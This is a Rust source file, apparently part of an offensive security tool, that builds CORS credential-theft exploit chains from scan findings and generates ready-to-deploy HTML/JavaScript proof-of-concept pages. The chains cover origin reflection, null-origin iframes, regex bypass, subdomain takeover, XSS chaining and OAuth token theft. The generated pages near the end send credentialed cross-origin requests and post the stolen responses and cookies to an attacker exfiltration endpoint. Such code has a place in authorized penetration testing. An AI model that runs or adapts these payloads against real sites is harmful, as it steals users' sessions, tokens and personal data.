use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fmt;

/// Categorizes the CORS credential theft exploitation scenario.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CorsChainType {
    /// Direct CORS misconfiguration: origin reflected or wildcard with credentials.
    DirectOriginReflection,
    /// Subdomain takeover of a trusted CORS origin, then exploit from that subdomain.
    SubdomainTakeover,
    /// XSS on a trusted origin used to inject CORS exploitation script.
    XssCorsExploit,
    /// OAuth token theft via CORS misconfiguration combined with redirect.
    OAuthTokenTheft,
    /// Null origin exploit: sandboxed iframe sets Origin: null.
    NullOriginExploit,
    /// Regex bypass: origin validation regex is insufficient (e.g., `example.com.evil.com`).
    RegexBypass,
}

impl fmt::Display for CorsChainType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::DirectOriginReflection => "direct-origin-reflection",
            Self::SubdomainTakeover => "subdomain-takeover",
            Self::XssCorsExploit => "xss-cors-exploit",
            Self::OAuthTokenTheft => "oauth-token-theft",
            Self::NullOriginExploit => "null-origin-exploit",
            Self::RegexBypass => "regex-bypass",
        };
        write!(f, "{label}")
    }
}

/// The type of CORS misconfiguration discovered.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CorsMisconfigType {
    /// `Access-Control-Allow-Origin` reflects the request `Origin` header verbatim.
    OriginReflection,
    /// `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.
    WildcardWithCredentials,
    /// Null origin is trusted: `Access-Control-Allow-Origin: null`.
    NullOriginTrusted,
    /// Regex allows prefix/suffix bypass (e.g., `evil-example.com` or `example.com.evil.com`).
    WeakRegexValidation,
    /// Trusted subdomains are accepted — exploitable via subdomain takeover.
    TrustedSubdomains,
    /// Pre-flight response allows dangerous methods (PUT, DELETE) with credentials.
    DangerousPreflightMethods,
}

impl fmt::Display for CorsMisconfigType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::OriginReflection => "origin-reflection",
            Self::WildcardWithCredentials => "wildcard-with-credentials",
            Self::NullOriginTrusted => "null-origin-trusted",
            Self::WeakRegexValidation => "weak-regex-validation",
            Self::TrustedSubdomains => "trusted-subdomains",
            Self::DangerousPreflightMethods => "dangerous-preflight-methods",
        };
        write!(f, "{label}")
    }
}

/// Types of sensitive data that can be stolen via CORS credential theft.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum StolenDataType {
    SessionToken,
    ApiKey,
    PersonalEmail,
    FullName,
    CreditCardPartial,
    SsnPartial,
    OAuthAccessToken,
    OAuthRefreshToken,
    CsrfToken,
    InternalApiResponse,
    UserProfile,
    PrivateMessages,
    FinancialData,
    MedicalRecords,
}

impl StolenDataType {
    /// Business impact score (0.0-10.0) for this data type being stolen.
    pub fn impact_score(&self) -> f64 {
        match self {
            Self::MedicalRecords => 10.0,
            Self::FinancialData => 9.5,
            Self::SsnPartial => 9.5,
            Self::CreditCardPartial => 9.0,
            Self::OAuthRefreshToken => 8.5,
            Self::OAuthAccessToken => 8.0,
            Self::SessionToken => 8.0,
            Self::ApiKey => 7.5,
            Self::CsrfToken => 7.0,
            Self::InternalApiResponse => 6.5,
            Self::PrivateMessages => 6.0,
            Self::PersonalEmail => 5.5,
            Self::FullName => 4.0,
            Self::UserProfile => 5.0,
        }
    }

    /// Regulatory frameworks that classify this data as protected.
    pub fn regulatory_impact(&self) -> &'static [&'static str] {
        match self {
            Self::MedicalRecords => &["HIPAA", "GDPR", "CCPA"],
            Self::FinancialData => &["PCI-DSS", "SOX", "GDPR"],
            Self::SsnPartial => &["CCPA", "GDPR", "State Breach Laws"],
            Self::CreditCardPartial => &["PCI-DSS", "GDPR"],
            Self::OAuthRefreshToken | Self::OAuthAccessToken => &["OAuth 2.0 Spec", "GDPR"],
            Self::SessionToken => &["OWASP Session Mgmt"],
            Self::ApiKey => &["Internal Policy"],
            Self::CsrfToken => &["OWASP CSRF Prevention"],
            Self::PersonalEmail | Self::FullName | Self::UserProfile => &["GDPR", "CCPA"],
            Self::PrivateMessages => &["GDPR", "ECPA"],
            Self::InternalApiResponse => &["Internal Policy"],
        }
    }
}

impl fmt::Display for StolenDataType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::SessionToken => "session-token",
            Self::ApiKey => "api-key",
            Self::PersonalEmail => "personal-email",
            Self::FullName => "full-name",
            Self::CreditCardPartial => "credit-card-partial",
            Self::SsnPartial => "ssn-partial",
            Self::OAuthAccessToken => "oauth-access-token",
            Self::OAuthRefreshToken => "oauth-refresh-token",
            Self::CsrfToken => "csrf-token",
            Self::InternalApiResponse => "internal-api-response",
            Self::UserProfile => "user-profile",
            Self::PrivateMessages => "private-messages",
            Self::FinancialData => "financial-data",
            Self::MedicalRecords => "medical-records",
        };
        write!(f, "{label}")
    }
}

/// A CORS misconfiguration finding from a scan.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CorsFinding {
    /// Target endpoint URL with the CORS misconfiguration.
    pub endpoint_url: String,
    /// Domain of the target endpoint.
    pub domain: String,
    /// Type of CORS misconfiguration discovered.
    pub misconfig_type: CorsMisconfigType,
    /// Whether `Access-Control-Allow-Credentials: true` is set.
    pub allows_credentials: bool,
    /// Allowed HTTP methods from `Access-Control-Allow-Methods`.
    pub allowed_methods: Vec<String>,
    /// Types of sensitive data this endpoint returns.
    pub exposed_data_types: Vec<StolenDataType>,
    /// Trusted origins or origin patterns, if identified.
    pub trusted_origins: Vec<String>,
}

impl CorsFinding {
    pub fn new(endpoint_url: &str, domain: &str, misconfig_type: CorsMisconfigType) -> Self {
        Self {
            endpoint_url: endpoint_url.to_string(),
            domain: domain.to_string(),
            misconfig_type,
            allows_credentials: true,
            allowed_methods: vec!["GET".to_string()],
            exposed_data_types: Vec::new(),
            trusted_origins: Vec::new(),
        }
    }

    pub fn with_credentials(mut self, allows: bool) -> Self {
        self.allows_credentials = allows;
        self
    }

    pub fn with_methods(mut self, methods: Vec<String>) -> Self {
        self.allowed_methods = methods;
        self
    }

    pub fn with_exposed_data(mut self, data_types: Vec<StolenDataType>) -> Self {
        self.exposed_data_types = data_types;
        self
    }

    pub fn with_trusted_origins(mut self, origins: Vec<String>) -> Self {
        self.trusted_origins = origins;
        self
    }
}

/// A single step in a CORS credential theft exploitation chain.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ChainStep {
    /// Step number (1-indexed).
    pub step_number: u32,
    /// Human-readable description of what happens in this step.
    pub description: String,
    /// Technical detail: the HTTP request or browser action taken.
    pub technical_detail: String,
    /// Expected server response or outcome.
    pub expected_outcome: String,
}

/// Business impact assessment for a CORS credential theft chain.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct BusinessImpact {
    /// Overall impact score (0.0-10.0).
    pub overall_score: f64,
    /// Per-data-type impact breakdown.
    pub data_impact: HashMap<String, f64>,
    /// Applicable regulatory frameworks.
    pub regulatory_frameworks: Vec<String>,
    /// Estimated severity label.
    pub severity_label: String,
    /// Narrative description of business consequences.
    pub business_narrative: String,
}

/// A complete CORS credential theft exploitation chain.
#[derive(Debug, Clone)]
pub struct CorsCredentialChain {
    /// Chain type classification.
    pub chain_type: CorsChainType,
    /// Target CORS finding this chain exploits.
    pub target_endpoint: String,
    /// Target domain.
    pub target_domain: String,
    /// The attacker-controlled origin used in the attack.
    pub attacker_origin: String,
    /// Ordered exploitation steps.
    pub steps: Vec<ChainStep>,
    /// Ready-to-deploy HTML/JS proof-of-concept.
    pub poc_html: String,
    /// Business impact assessment.
    pub impact: BusinessImpact,
    /// CORS misconfig type being exploited.
    pub misconfig_type: CorsMisconfigType,
    /// Severity score (0.0-10.0).
    pub severity: f64,
    /// Prerequisite conditions for this chain.
    pub prerequisites: Vec<String>,
}

/// Generates CORS credential theft exploitation chains.
pub struct CorsCredentialChainGenerator {
    findings: Vec<CorsFinding>,
    attacker_domain: String,
    exfil_endpoint: String,
    takeover_subdomains: Vec<String>,
    xss_endpoints: Vec<XssEndpoint>,
    oauth_endpoints: Vec<OAuthEndpoint>,
}

/// An XSS vulnerability that can be chained with CORS exploitation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct XssEndpoint {
    /// URL of the XSS-vulnerable endpoint.
    pub url: String,
    /// Domain of the XSS endpoint.
    pub domain: String,
    /// XSS injection parameter.
    pub param: String,
    /// Whether this is stored or reflected XSS.
    pub is_stored: bool,
}

/// An OAuth endpoint that can be chained with CORS exploitation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OAuthEndpoint {
    /// OAuth authorization URL.
    pub auth_url: String,
    /// OAuth token endpoint.
    pub token_url: String,
    /// Domain of the OAuth provider.
    pub domain: String,
    /// Registered client_id.
    pub client_id: String,
    /// OAuth scopes.
    pub scopes: Vec<String>,
}

impl CorsCredentialChainGenerator {
    pub fn new(attacker_domain: &str) -> Self {
        Self {
            findings: Vec::new(),
            attacker_domain: attacker_domain.to_string(),
            exfil_endpoint: format!("https://{attacker_domain}/exfil"),
            takeover_subdomains: Vec::new(),
            xss_endpoints: Vec::new(),
            oauth_endpoints: Vec::new(),
        }
    }

    pub fn with_exfil_endpoint(mut self, endpoint: &str) -> Self {
        self.exfil_endpoint = endpoint.to_string();
        self
    }

    pub fn add_finding(&mut self, finding: CorsFinding) {
        self.findings.push(finding);
    }

    pub fn add_findings(&mut self, findings: Vec<CorsFinding>) {
        self.findings.extend(findings);
    }

    pub fn add_takeover_subdomain(&mut self, subdomain: &str) {
        self.takeover_subdomains.push(subdomain.to_string());
    }

    pub fn add_xss_endpoint(&mut self, endpoint: XssEndpoint) {
        self.xss_endpoints.push(endpoint);
    }

    pub fn add_oauth_endpoint(&mut self, endpoint: OAuthEndpoint) {
        self.oauth_endpoints.push(endpoint);
    }

    /// Generate all viable exploitation chains from registered findings.
    pub fn generate_all_chains(&self) -> Vec<CorsCredentialChain> {
        let mut chains = Vec::new();

        for finding in &self.findings {
            if !finding.allows_credentials {
                continue;
            }

            chains.extend(self.generate_direct_chains(finding));
            chains.extend(self.generate_null_origin_chains(finding));
            chains.extend(self.generate_regex_bypass_chains(finding));
            chains.extend(self.generate_subdomain_takeover_chains(finding));
            chains.extend(self.generate_xss_cors_chains(finding));
            chains.extend(self.generate_oauth_chains(finding));
        }

        chains
    }

    /// Generate direct origin reflection exploitation chains.
    pub fn generate_direct_chains(&self, finding: &CorsFinding) -> Vec<CorsCredentialChain> {
        if finding.misconfig_type != CorsMisconfigType::OriginReflection
            && finding.misconfig_type != CorsMisconfigType::WildcardWithCredentials
        {
            return Vec::new();
        }

        let attacker_origin = format!("https://{}", self.attacker_domain);
        let steps = vec![
            ChainStep {
                step_number: 1,
                description: "Victim visits attacker-controlled page".to_string(),
                technical_detail: format!(
                    "User navigates to {attacker_origin}/exploit.html via phishing link or ad"
                ),
                expected_outcome:
                    "Attacker page loads in victim's browser with active session cookies"
                        .to_string(),
            },
            ChainStep {
                step_number: 2,
                description: "JavaScript sends cross-origin credentialed request".to_string(),
                technical_detail: format!(
                    "XMLHttpRequest/fetch to {} with withCredentials=true; Origin: {attacker_origin}",
                    finding.endpoint_url
                ),
                expected_outcome: format!(
                    "Server reflects Origin in ACAO header, ACAC: true; response contains {}",
                    format_data_types(&finding.exposed_data_types)
                ),
            },
            ChainStep {
                step_number: 3,
                description: "Read cross-origin response containing user data".to_string(),
                technical_detail:
                    "Browser allows JS to read response body due to valid CORS headers".to_string(),
                expected_outcome: "Attacker JS has full access to response JSON/HTML".to_string(),
            },
            ChainStep {
                step_number: 4,
                description: "Exfiltrate stolen data to attacker server".to_string(),
                technical_detail: format!(
                    "POST stolen data to {} via navigator.sendBeacon or fetch",
                    self.exfil_endpoint
                ),
                expected_outcome: "Attacker receives victim's sensitive data on their server"
                    .to_string(),
            },
        ];

        let poc_html = generate_direct_poc(
            &finding.endpoint_url,
            &self.exfil_endpoint,
            &finding.allowed_methods,
        );

        let impact = compute_impact(finding);

        vec![CorsCredentialChain {
            chain_type: CorsChainType::DirectOriginReflection,
            target_endpoint: finding.endpoint_url.clone(),
            target_domain: finding.domain.clone(),
            attacker_origin,
            steps,
            poc_html,
            impact,
            misconfig_type: finding.misconfig_type,
            severity: compute_chain_severity(CorsChainType::DirectOriginReflection, finding),
            prerequisites: vec![
                "Victim must have active session on target domain".to_string(),
                "Victim must visit attacker-controlled page".to_string(),
            ],
        }]
    }

    /// Generate null origin exploitation chains via sandboxed iframe.
    pub fn generate_null_origin_chains(&self, finding: &CorsFinding) -> Vec<CorsCredentialChain> {
        if finding.misconfig_type != CorsMisconfigType::NullOriginTrusted {
            return Vec::new();
        }

        let attacker_origin = format!("https://{}", self.attacker_domain);
        let steps = vec![
            ChainStep {
                step_number: 1,
                description: "Victim visits page containing sandboxed iframe".to_string(),
                technical_detail: format!(
                    "Attacker page at {attacker_origin} embeds <iframe sandbox=\"allow-scripts allow-forms\" src=\"data:text/html,...\">"
                ),
                expected_outcome: "Sandboxed iframe loads with Origin: null".to_string(),
            },
            ChainStep {
                step_number: 2,
                description: "Sandboxed script sends credentialed cross-origin request".to_string(),
                technical_detail: format!(
                    "Inside iframe: fetch('{}', {{credentials: 'include'}}) — browser sends Origin: null",
                    finding.endpoint_url
                ),
                expected_outcome:
                    "Server responds with Access-Control-Allow-Origin: null, ACAC: true".to_string(),
            },
            ChainStep {
                step_number: 3,
                description: "Read response and relay to parent frame".to_string(),
                technical_detail:
                    "iframe script reads response, uses parent.postMessage() to send data up"
                        .to_string(),
                expected_outcome: "Parent page receives stolen data via message event".to_string(),
            },
            ChainStep {
                step_number: 4,
                description: "Exfiltrate data to attacker server".to_string(),
                technical_detail: format!("Parent page POSTs data to {}", self.exfil_endpoint),
                expected_outcome: "Attacker collects victim data".to_string(),
            },
        ];

        let poc_html = generate_null_origin_poc(&finding.endpoint_url, &self.exfil_endpoint);

        let impact = compute_impact(finding);

        vec![CorsCredentialChain {
            chain_type: CorsChainType::NullOriginExploit,
            target_endpoint: finding.endpoint_url.clone(),
            target_domain: finding.domain.clone(),
            attacker_origin,
            steps,
            poc_html,
            impact,
            misconfig_type: finding.misconfig_type,
            severity: compute_chain_severity(CorsChainType::NullOriginExploit, finding),
            prerequisites: vec![
                "Target must accept Origin: null with credentials".to_string(),
                "Victim must visit attacker page".to_string(),
            ],
        }]
    }

    /// Generate regex bypass exploitation chains.
    pub fn generate_regex_bypass_chains(&self, finding: &CorsFinding) -> Vec<CorsCredentialChain> {
        if finding.misconfig_type != CorsMisconfigType::WeakRegexValidation {
            return Vec::new();
        }

        let bypass_origins = generate_regex_bypass_origins(&finding.domain, &self.attacker_domain);

        bypass_origins
            .into_iter()
            .map(|bypass_origin| {
                let steps = vec![
                    ChainStep {
                        step_number: 1,
                        description: "Attacker registers domain that passes regex validation".to_string(),
                        technical_detail: format!(
                            "Register domain: {bypass_origin} — passes server's origin regex for {}",
                            finding.domain
                        ),
                        expected_outcome: "Attacker controls a domain the target trusts".to_string(),
                    },
                    ChainStep {
                        step_number: 2,
                        description: "Host exploit page on bypass domain".to_string(),
                        technical_detail: format!(
                            "Serve CORS exploit HTML at {bypass_origin}/exploit.html"
                        ),
                        expected_outcome: "Victim visits bypass domain page".to_string(),
                    },
                    ChainStep {
                        step_number: 3,
                        description: "Send credentialed cross-origin request from bypass origin".to_string(),
                        technical_detail: format!(
                            "fetch('{}', {{credentials: 'include'}}) from {bypass_origin}",
                            finding.endpoint_url
                        ),
                        expected_outcome: "Server accepts bypass origin, responds with ACAO + ACAC headers".to_string(),
                    },
                    ChainStep {
                        step_number: 4,
                        description: "Exfiltrate stolen response data".to_string(),
                        technical_detail: format!(
                            "Forward response to {}",
                            self.exfil_endpoint
                        ),
                        expected_outcome: "Attacker receives victim's sensitive data".to_string(),
                    },
                ];

                let poc_html = generate_regex_bypass_poc(
                    &finding.endpoint_url,
                    &self.exfil_endpoint,
                    &bypass_origin,
                );

                CorsCredentialChain {
                    chain_type: CorsChainType::RegexBypass,
                    target_endpoint: finding.endpoint_url.clone(),
                    target_domain: finding.domain.clone(),
                    attacker_origin: bypass_origin,
                    steps,
                    poc_html,
                    impact: compute_impact(finding),
                    misconfig_type: finding.misconfig_type,
                    severity: compute_chain_severity(CorsChainType::RegexBypass, finding),
                    prerequisites: vec![
                        "Attacker must register a domain that passes the regex".to_string(),
                        "Victim must visit attacker page on bypass domain".to_string(),
                    ],
                }
            })
            .collect()
    }

    /// Generate subdomain takeover + CORS exploitation chains.
    pub fn generate_subdomain_takeover_chains(
        &self,
        finding: &CorsFinding,
    ) -> Vec<CorsCredentialChain> {
        if finding.misconfig_type != CorsMisconfigType::TrustedSubdomains
            && finding.misconfig_type != CorsMisconfigType::OriginReflection
        {
            return Vec::new();
        }

        if self.takeover_subdomains.is_empty() {
            return Vec::new();
        }

        self.takeover_subdomains
            .iter()
            .map(|subdomain| {
                let takeover_origin = format!("https://{subdomain}");
                let steps = vec![
                    ChainStep {
                        step_number: 1,
                        description: "Take over dangling subdomain".to_string(),
                        technical_detail: format!(
                            "Claim {subdomain} via dangling CNAME/A record pointing to unclaimed resource"
                        ),
                        expected_outcome: format!(
                            "Attacker controls {subdomain}, a trusted CORS origin for {}",
                            finding.domain
                        ),
                    },
                    ChainStep {
                        step_number: 2,
                        description: "Host CORS exploit page on taken-over subdomain".to_string(),
                        technical_detail: format!(
                            "Deploy exploit HTML at {takeover_origin}/exploit.html"
                        ),
                        expected_outcome: "Exploit page served from trusted subdomain origin".to_string(),
                    },
                    ChainStep {
                        step_number: 3,
                        description: "Send credentialed request from trusted subdomain".to_string(),
                        technical_detail: format!(
                            "fetch('{}', {{credentials: 'include'}}) with Origin: {takeover_origin}",
                            finding.endpoint_url
                        ),
                        expected_outcome: "Server trusts subdomain origin, returns data with ACAO + ACAC".to_string(),
                    },
                    ChainStep {
                        step_number: 4,
                        description: "Exfiltrate stolen data".to_string(),
                        technical_detail: format!(
                            "POST response to {}",
                            self.exfil_endpoint
                        ),
                        expected_outcome: "Victim data exfiltrated via attacker server".to_string(),
                    },
                ];

                let poc_html = generate_subdomain_takeover_poc(
                    &finding.endpoint_url,
                    &self.exfil_endpoint,
                    subdomain,
                );

                CorsCredentialChain {
                    chain_type: CorsChainType::SubdomainTakeover,
                    target_endpoint: finding.endpoint_url.clone(),
                    target_domain: finding.domain.clone(),
                    attacker_origin: takeover_origin,
                    steps,
                    poc_html,
                    impact: compute_impact(finding),
                    misconfig_type: finding.misconfig_type,
                    severity: compute_chain_severity(CorsChainType::SubdomainTakeover, finding),
                    prerequisites: vec![
                        format!("Subdomain {subdomain} must have dangling DNS record"),
                        "Attacker must claim the subdomain on the hosting provider".to_string(),
                        "Victim must visit the taken-over subdomain page".to_string(),
                    ],
                }
            })
            .collect()
    }

    /// Generate XSS + CORS chained exploitation.
    pub fn generate_xss_cors_chains(&self, finding: &CorsFinding) -> Vec<CorsCredentialChain> {
        if self.xss_endpoints.is_empty() {
            return Vec::new();
        }

        let matching_xss: Vec<&XssEndpoint> = self
            .xss_endpoints
            .iter()
            .filter(|xss| is_trusted_origin(finding, &xss.domain))
            .collect();

        matching_xss
            .into_iter()
            .map(|xss| {
                let xss_origin = format!("https://{}", xss.domain);
                let injection_type = if xss.is_stored { "stored" } else { "reflected" };
                let steps = vec![
                    ChainStep {
                        step_number: 1,
                        description: format!("Inject CORS exploit script via {injection_type} XSS"),
                        technical_detail: format!(
                            "Inject payload into {}?{}=<script>...</script> ({})",
                            xss.url, xss.param, injection_type
                        ),
                        expected_outcome: "CORS exploitation script executes in context of trusted origin".to_string(),
                    },
                    ChainStep {
                        step_number: 2,
                        description: "Injected script sends credentialed CORS request".to_string(),
                        technical_detail: format!(
                            "XSS payload executes: fetch('{}', {{credentials: 'include'}})",
                            finding.endpoint_url
                        ),
                        expected_outcome: format!(
                            "Server trusts {xss_origin}, responds with sensitive data + CORS headers"
                        ),
                    },
                    ChainStep {
                        step_number: 3,
                        description: "Read response and exfiltrate".to_string(),
                        technical_detail: format!(
                            "XSS script reads response body, sends to {}",
                            self.exfil_endpoint
                        ),
                        expected_outcome: "Attacker receives victim's data".to_string(),
                    },
                ];

                let poc_html = generate_xss_cors_poc(
                    &finding.endpoint_url,
                    &self.exfil_endpoint,
                    &xss.url,
                    &xss.param,
                    xss.is_stored,
                );

                CorsCredentialChain {
                    chain_type: CorsChainType::XssCorsExploit,
                    target_endpoint: finding.endpoint_url.clone(),
                    target_domain: finding.domain.clone(),
                    attacker_origin: xss_origin,
                    steps,
                    poc_html,
                    impact: compute_impact(finding),
                    misconfig_type: finding.misconfig_type,
                    severity: compute_chain_severity(CorsChainType::XssCorsExploit, finding),
                    prerequisites: vec![
                        format!("{injection_type} XSS on {} (param: {})", xss.url, xss.param),
                        "XSS origin must be trusted by the CORS policy".to_string(),
                    ],
                }
            })
            .collect()
    }

    /// Generate OAuth token theft via CORS + redirect chains.
    pub fn generate_oauth_chains(&self, finding: &CorsFinding) -> Vec<CorsCredentialChain> {
        if self.oauth_endpoints.is_empty() {
            return Vec::new();
        }

        self.oauth_endpoints
            .iter()
            .map(|oauth| {
                let attacker_origin = format!("https://{}", self.attacker_domain);
                let steps = vec![
                    ChainStep {
                        step_number: 1,
                        description: "Victim clicks crafted OAuth authorization link".to_string(),
                        technical_detail: format!(
                            "Link: {}/authorize?client_id={}&redirect_uri={}&scope={}&response_type=code",
                            oauth.auth_url,
                            oauth.client_id,
                            simple_url_encode(&attacker_origin),
                            oauth.scopes.join("+"),
                        ),
                        expected_outcome: "Victim authenticates and is redirected with auth code".to_string(),
                    },
                    ChainStep {
                        step_number: 2,
                        description: "Attacker page captures OAuth code and requests token".to_string(),
                        technical_detail: format!(
                            "Attacker page extracts code from URL, sends to {attacker_origin}/capture"
                        ),
                        expected_outcome: "Attacker obtains authorization code".to_string(),
                    },
                    ChainStep {
                        step_number: 3,
                        description: "Use CORS misconfiguration to steal token via credentialed request".to_string(),
                        technical_detail: format!(
                            "fetch('{}', {{credentials: 'include'}}) from attacker origin to read token endpoint response",
                            finding.endpoint_url
                        ),
                        expected_outcome: "CORS misconfig allows reading OAuth token response".to_string(),
                    },
                    ChainStep {
                        step_number: 4,
                        description: "Exfiltrate OAuth tokens".to_string(),
                        technical_detail: format!(
                            "POST access_token + refresh_token to {}",
                            self.exfil_endpoint
                        ),
                        expected_outcome: "Attacker has full OAuth tokens for victim's account".to_string(),
                    },
                ];

                let poc_html = generate_oauth_poc(
                    &finding.endpoint_url,
                    &self.exfil_endpoint,
                    &oauth.auth_url,
                    &oauth.client_id,
                    &oauth.scopes,
                );

                CorsCredentialChain {
                    chain_type: CorsChainType::OAuthTokenTheft,
                    target_endpoint: finding.endpoint_url.clone(),
                    target_domain: finding.domain.clone(),
                    attacker_origin,
                    steps,
                    poc_html,
                    impact: compute_impact(finding),
                    misconfig_type: finding.misconfig_type,
                    severity: compute_chain_severity(CorsChainType::OAuthTokenTheft, finding),
                    prerequisites: vec![
                        "OAuth flow must be exploitable (open redirect_uri or lax validation)".to_string(),
                        "CORS misconfig must allow reading token endpoint response".to_string(),
                        "Victim must authenticate via crafted OAuth link".to_string(),
                    ],
                }
            })
            .collect()
    }

    /// Count of registered findings.
    pub fn finding_count(&self) -> usize {
        self.findings.len()
    }

    /// Count of registered takeover subdomains.
    pub fn takeover_subdomain_count(&self) -> usize {
        self.takeover_subdomains.len()
    }
}

/// Compute business impact for a CORS finding.
pub fn compute_impact(finding: &CorsFinding) -> BusinessImpact {
    let mut data_impact: HashMap<String, f64> = HashMap::new();
    let mut max_score: f64 = 0.0;
    let mut all_frameworks: Vec<String> = Vec::new();

    for data_type in &finding.exposed_data_types {
        let score = data_type.impact_score();
        data_impact.insert(data_type.to_string(), score);
        if score > max_score {
            max_score = score;
        }
        for framework in data_type.regulatory_impact() {
            let f = framework.to_string();
            if !all_frameworks.contains(&f) {
                all_frameworks.push(f);
            }
        }
    }

    let method_multiplier = if finding
        .allowed_methods
        .iter()
        .any(|m| m == "PUT" || m == "DELETE" || m == "PATCH")
    {
        1.15
    } else {
        1.0
    };

    let overall_score = if finding.exposed_data_types.is_empty() {
        base_misconfig_score(finding.misconfig_type) * method_multiplier
    } else {
        (max_score * method_multiplier).min(10.0)
    };

    let severity_label = match overall_score {
        s if s >= 9.0 => "Critical",
        s if s >= 7.0 => "High",
        s if s >= 4.0 => "Medium",
        _ => "Low",
    }
    .to_string();

    let business_narrative = build_business_narrative(
        &finding.domain,
        &finding.exposed_data_types,
        &all_frameworks,
        overall_score,
    );

    BusinessImpact {
        overall_score,
        data_impact,
        regulatory_frameworks: all_frameworks,
        severity_label,
        business_narrative,
    }
}

fn base_misconfig_score(misconfig: CorsMisconfigType) -> f64 {
    match misconfig {
        CorsMisconfigType::OriginReflection => 7.0,
        CorsMisconfigType::WildcardWithCredentials => 8.0,
        CorsMisconfigType::NullOriginTrusted => 6.5,
        CorsMisconfigType::WeakRegexValidation => 6.0,
        CorsMisconfigType::TrustedSubdomains => 5.5,
        CorsMisconfigType::DangerousPreflightMethods => 7.5,
    }
}

pub fn compute_chain_severity(chain_type: CorsChainType, finding: &CorsFinding) -> f64 {
    let base = match chain_type {
        CorsChainType::DirectOriginReflection => 8.5,
        CorsChainType::SubdomainTakeover => 9.0,
        CorsChainType::XssCorsExploit => 9.0,
        CorsChainType::OAuthTokenTheft => 9.5,
        CorsChainType::NullOriginExploit => 7.5,
        CorsChainType::RegexBypass => 8.0,
    };

    let data_bonus = if finding.exposed_data_types.is_empty() {
        0.0
    } else {
        let max_data_score = finding
            .exposed_data_types
            .iter()
            .map(|d| d.impact_score())
            .fold(0.0_f64, f64::max);
        (max_data_score - 5.0).max(0.0) * 0.1
    };

    (base + data_bonus).min(10.0)
}

fn is_trusted_origin(finding: &CorsFinding, domain: &str) -> bool {
    if finding.misconfig_type == CorsMisconfigType::OriginReflection
        || finding.misconfig_type == CorsMisconfigType::WildcardWithCredentials
    {
        return true;
    }

    if finding.domain == domain {
        return true;
    }

    if domain.ends_with(&format!(".{}", finding.domain)) {
        return true;
    }

    finding
        .trusted_origins
        .iter()
        .any(|origin| origin.contains(domain))
}

fn format_data_types(data_types: &[StolenDataType]) -> String {
    if data_types.is_empty() {
        "sensitive data".to_string()
    } else {
        data_types
            .iter()
            .map(|d| d.to_string())
            .collect::<Vec<_>>()
            .join(", ")
    }
}

fn build_business_narrative(
    domain: &str,
    data_types: &[StolenDataType],
    frameworks: &[String],
    score: f64,
) -> String {
    let data_desc = if data_types.is_empty() {
        "unspecified sensitive data".to_string()
    } else {
        data_types
            .iter()
            .map(|d| d.to_string())
            .collect::<Vec<_>>()
            .join(", ")
    };

    let severity_word = if score >= 9.0 {
        "critical"
    } else if score >= 7.0 {
        "high"
    } else {
        "moderate"
    };

    let regulatory_clause = if frameworks.is_empty() {
        String::new()
    } else {
        format!(
            " This may trigger obligations under {}.",
            frameworks.join(", ")
        )
    };

    format!(
        "CORS misconfiguration on {domain} enables theft of {data_desc} from authenticated users. \
         Severity: {severity_word} (score: {score:.1}/10.0). \
         An attacker can silently exfiltrate data by luring victims to a malicious page.{regulatory_clause}"
    )
}

fn generate_regex_bypass_origins(target_domain: &str, attacker_domain: &str) -> Vec<String> {
    vec![
        format!("https://{target_domain}.{attacker_domain}"),
        format!("https://{attacker_domain}.{target_domain}"),
        format!("https://not-{target_domain}.{attacker_domain}"),
        format!("https://{target_domain}a.{attacker_domain}"),
    ]
}

fn simple_url_encode(input: &str) -> String {
    input
        .replace('%', "%25")
        .replace(' ', "%20")
        .replace('&', "%26")
        .replace('=', "%3D")
        .replace('+', "%2B")
}

// --- PoC HTML generators ---

fn generate_direct_poc(target_url: &str, exfil_url: &str, methods: &[String]) -> String {
    let method = if methods.contains(&"GET".to_string()) {
        "GET"
    } else {
        methods.first().map(|m| m.as_str()).unwrap_or("GET")
    };

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC - Direct Origin Reflection</title></head>
<body>
<h1>CORS Credential Theft PoC</h1>
<p>Target: {target_url}</p>
<div id="result">Waiting...</div>
<script>
(function() {{
    var xhr = new XMLHttpRequest();
    xhr.open('{method}', '{target_url}', true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
            document.getElementById('result').innerText = xhr.responseText;
            // Exfiltrate stolen data
            var exfil = new XMLHttpRequest();
            exfil.open('POST', '{exfil_url}', true);
            exfil.setRequestHeader('Content-Type', 'application/json');
            exfil.send(JSON.stringify({{
                stolen_from: '{target_url}',
                data: xhr.responseText,
                cookies: document.cookie
            }}));
        }}
    }};
    xhr.send();
}})();
</script>
</body>
</html>"#
    )
}

fn generate_null_origin_poc(target_url: &str, exfil_url: &str) -> String {
    let inner_script = format!(
        r#"var xhr=new XMLHttpRequest();xhr.open('GET','{target_url}',true);xhr.withCredentials=true;xhr.onload=function(){{parent.postMessage(xhr.responseText,'*')}};xhr.send();"#
    );

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC - Null Origin Exploit</title></head>
<body>
<h1>CORS Null Origin Exploit PoC</h1>
<p>Target: {target_url}</p>
<div id="result">Waiting...</div>
<iframe sandbox="allow-scripts allow-forms" srcdoc="<script>{inner_script}</script>" style="display:none"></iframe>
<script>
window.addEventListener('message', function(e) {{
    document.getElementById('result').innerText = e.data;
    navigator.sendBeacon('{exfil_url}', JSON.stringify({{
        stolen_from: '{target_url}',
        data: e.data,
        method: 'null-origin'
    }}));
}});
</script>
</body>
</html>"#
    )
}

